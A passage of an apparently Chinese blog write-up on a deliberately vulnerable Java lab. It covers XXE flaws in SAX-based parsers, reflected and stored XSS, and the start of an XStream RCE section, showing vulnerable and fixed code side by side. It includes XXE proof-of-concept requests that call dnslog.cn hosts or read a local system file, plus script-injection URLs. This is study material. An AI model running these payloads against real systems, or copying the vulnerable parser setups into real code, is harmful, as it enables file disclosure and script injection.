class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span></span><br><span class="hljs-meta"><span class="language-xml">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://v50sch.dnslog.cn&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080944871.png" alt="20250727122448607"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080944391.png" alt="20250727122444351"></p><h3 id="4-SAXBuilder-sec"><a href="#4-SAXBuilder-sec" class="headerlink" title="4.&#x2F;SAXBuilder&#x2F;sec"></a>4.&#x2F;SAXBuilder&#x2F;sec</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@RequestMapping(value = &quot;/SAXBuilder/sec&quot;, method = RequestMethod.POST)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">SAXBuilderSec</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>        logger.info(body);<br><br>        <span class="hljs-type">SAXBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SAXBuilder</span>();<br>        <span class="hljs-comment">//禁止 DOCTYPE 声明。</span><br>        builder.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//禁止解析 外部通用实体 &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br>        builder.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>        <span class="hljs-comment">//禁止解析 外部参数实体</span><br>        builder.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>        <span class="hljs-comment">// org.jdom2.Document document</span><br>        builder.build(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(body)));<br><br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.toString());<br>        <span class="hljs-keyword">return</span> EXCEPT;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;SAXBuilder xxe security code&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-SAXReader-vuln"><a href="#5-SAXReader-vuln" class="headerlink" title="5.&#x2F;SAXReader&#x2F;vuln"></a>5.&#x2F;SAXReader&#x2F;vuln</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/SAXReader/vuln&quot;, method = RequestMethod.POST)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">SAXReaderVuln</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>        logger.info(body);<br><br>        <span class="hljs-type">SAXReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SAXReader</span>();<br>        <span class="hljs-comment">// org.dom4j.Document document</span><br>        reader.read(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(body))); <span class="hljs-comment">// cause xxe</span><br><br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.toString());<br>        <span class="hljs-keyword">return</span> EXCEPT;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;SAXReader xxe vuln code&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>POC:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xxe/SAXReader/vuln</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8081<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=D2EF253CA324816B83856F97FD262FA9; XSRF-TOKEN=77424855-a7a9-48d1-a3f6-a41419feacf0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>150<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span></span><br><span class="hljs-meta"><span class="language-xml">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://f89q97.dnslog.cn&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080944246.png" alt="20250727123019413"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080945207.png" alt="20250727123025939"></p><h3 id="6-SAXReader-sec"><a href="#6-SAXReader-sec" class="headerlink" title="6.&#x2F;SAXReader&#x2F;sec"></a>6.&#x2F;SAXReader&#x2F;sec</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/SAXReader/sec&quot;, method = RequestMethod.POST)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">SAXReaderSec</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>        logger.info(body);<br><br>        <span class="hljs-type">SAXReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SAXReader</span>();<br>        reader.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="hljs-literal">true</span>);<br>        reader.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>        reader.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>        <span class="hljs-comment">// org.dom4j.Document document</span><br>        reader.read(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(body)));<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.toString());<br>        <span class="hljs-keyword">return</span> EXCEPT;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;SAXReader xxe security code&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="7-SAXParser-vuln"><a href="#7-SAXParser-vuln" class="headerlink" title="7.&#x2F;SAXParser&#x2F;vuln"></a>7.&#x2F;SAXParser&#x2F;vuln</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/SAXParser/vuln&quot;, method = RequestMethod.POST)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">SAXParserVuln</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>        logger.info(body);<br><br>        <span class="hljs-type">SAXParserFactory</span> <span class="hljs-variable">spf</span> <span class="hljs-operator">=</span> SAXParserFactory.newInstance();<br>        <span class="hljs-type">SAXParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> spf.newSAXParser();<br>        parser.parse(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(body)), <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultHandler</span>());  <span class="hljs-comment">// parse xml</span><br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;SAXParser xxe vuln code&quot;</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.toString());<br>        <span class="hljs-keyword">return</span> EXCEPT;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>POC:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xxe/SAXParser/vuln</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8081<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=D2EF253CA324816B83856F97FD262FA9; XSRF-TOKEN=77424855-a7a9-48d1-a3f6-a41419feacf0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>152<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span></span><br><span class="hljs-meta"><span class="language-xml">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://h1bdeh.dnslog.cn&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080945564.png" alt="20250727123517394"></p><h3 id="8-SAXParser-sec"><a href="#8-SAXParser-sec" class="headerlink" title="8.&#x2F;SAXParser&#x2F;sec"></a>8.&#x2F;SAXParser&#x2F;sec</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/SAXParser/sec&quot;, method = RequestMethod.POST)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">SAXParserSec</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>        logger.info(body);<br><br>        <span class="hljs-type">SAXParserFactory</span> <span class="hljs-variable">spf</span> <span class="hljs-operator">=</span> SAXParserFactory.newInstance();<br>        spf.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="hljs-literal">true</span>);<br>        spf.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>        spf.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>        <span class="hljs-type">SAXParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> spf.newSAXParser();<br>        parser.parse(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(body)), <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultHandler</span>());  <span class="hljs-comment">// parse xml</span><br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.toString());<br>        <span class="hljs-keyword">return</span> EXCEPT;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;SAXParser xxe security code&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="9-这些方法的利用和修复都是一样的。"><a href="#9-这些方法的利用和修复都是一样的。" class="headerlink" title="9.这些方法的利用和修复都是一样的。"></a>9.这些方法的利用和修复都是一样的。</h3><p>POC构造：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs xml">POST /xxe/***/*** HTTP/1.1<br>Host: 127.0.0.1:8081<br>Content-Type: application/xml<br>Content-Length: 198  可以不写<br>Connection: close<br>        此处空一行 分隔 Header 与 Body <br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [  </span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///C:/Windows/win.ini&quot;</span>&gt;</span>  </span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br>或<br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://1izyf3.dnslog.cn&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>修复：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">xmlReader.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="hljs-literal">true</span>);<br>xmlReader.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>xmlReader.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/reflect&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">reflect</span><span class="hljs-params">(String xss)</span> &#123;<br>    <span class="hljs-keyword">return</span> xss;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://127.0.0.1:8081/xss/reflect?xss=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080946271.png" alt="20250727110941871"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//先将 xss 储存在 cookie 中，</span><br><span class="hljs-meta">@RequestMapping(&quot;/stored/store&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">store</span><span class="hljs-params">(String xss, HttpServletResponse response)</span> &#123;<br>    <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cookie</span>(<span class="hljs-string">&quot;xss&quot;</span>, xss);<br>    response.addCookie(cookie);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Set param into cookie&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">//访问 /stored/show 看到xss</span><br> <span class="hljs-meta">@RequestMapping(&quot;/stored/show&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">show</span><span class="hljs-params">(<span class="hljs-meta">@CookieValue(&quot;xss&quot;)</span> String xss)</span> &#123;<br>        <span class="hljs-keyword">return</span> xss;<br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span><span class="hljs-regexp">/xss/</span>stored<span class="hljs-regexp">/store?xss=&lt;script&gt;alert(1)&lt;/</span>script&gt;<br><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span><span class="hljs-regexp">/xss/</span>stored/show<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080946560.png" alt="20250727111445251"></p><p><img src="https://gitee.com/xvshifu/pic-go/raw/master/img/20250727111506996.png" alt="image-20250727111506881"></p><h2 id="XStreamRce"><a href="#XStreamRce" class="headerlink" title="XStreamRce"></a>XStreamRce</h2><blockquote><p>XStream是Java类库，用来将对象序列化成XML （JSON）或反序列化为对象。</p><p><strong>也就是说，使用XStream，我们可以把Java对象转换成XML，也可以将XML转换为Java对象。</strong></p><p>有RCE漏洞受影响版本：<br>Xstream affected version: 1.4.10 or &lt;&#x3D; 1.4.6</p><p>CVE-2020-26217 | XStream远程代码执行漏洞 </p><p><a href="https://www.cnblogs.com/303donatello/p/13998245.html">https://www.cnblogs.com/303donatello/p/13998245.html</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080947532.png" alt="20250727124508575"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@PostMapping(&quot;/xstream&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">parseXml</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">xml</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>    <span class="hljs-type">XStream</span> <span class="hljs-variable">xstream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DomDriver</span>());<br>    xstream.addPermission(AnyTypePermission.ANY); <span class="hljs-comment">// This will cause all XStream versions to be affected.</span><br>    xstream.fromXML(xml);<br>    <span class="hljs-keyword">return</span> <span 